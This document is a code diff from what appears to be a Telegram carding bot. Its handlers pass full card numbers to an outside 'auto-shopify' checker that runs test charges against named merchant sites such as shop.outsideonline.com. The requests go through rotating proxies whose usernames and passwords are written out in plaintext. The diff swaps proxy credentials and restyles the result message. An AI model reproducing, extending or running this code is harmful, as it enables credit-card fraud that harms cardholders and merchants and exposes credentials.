@@ -2690,7 +2690,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             f"https://auto-shopify-6cz4.onrender.com/index.php"
             f"?site=https://deansafe.com"
             f"&cc={full_card}"
-            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+            f"&proxy=qhlpirsk-247:96zjmb7awmom@p.webshare.io:80"
         )
 
         async with aiohttp.ClientSession() as session:
@@ -2747,7 +2747,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- Final formatted message ---
         final_msg = (
-            f"◇━━〔 <b>SHOPIFY</b> 〕━━◇\n"
+            f"◇━━〔 <b>𝑺𝒉𝒐𝒑𝒊𝒇𝒚</b> 〕━━◇\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
             f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 𝟎.𝟗𝟖$\n"
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>\n"
@@ -2921,7 +2921,7 @@ async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             f"https://auto-shopify-6cz4.onrender.com/index.php"
             f"?site=https://shop.outsideonline.com"
             f"&cc={full_card}"
-            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+            f"&proxy=qhlpirsk-241:96zjmb7awmom@p.webshare.io:80"
         )
 
         async with aiohttp.ClientSession() as session:
@@ -3149,7 +3149,7 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             f"https://auto-shopify-6cz4.onrender.com/index.php"
             f"?site=https://trimleaf.ca"
             f"&cc={full_card}"
-            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+            f"&proxy=qhlpirsk-239:96zjmb7awmom@p.webshare.io:80"
         )
 
         async with aiohttp.ClientSession() as session:
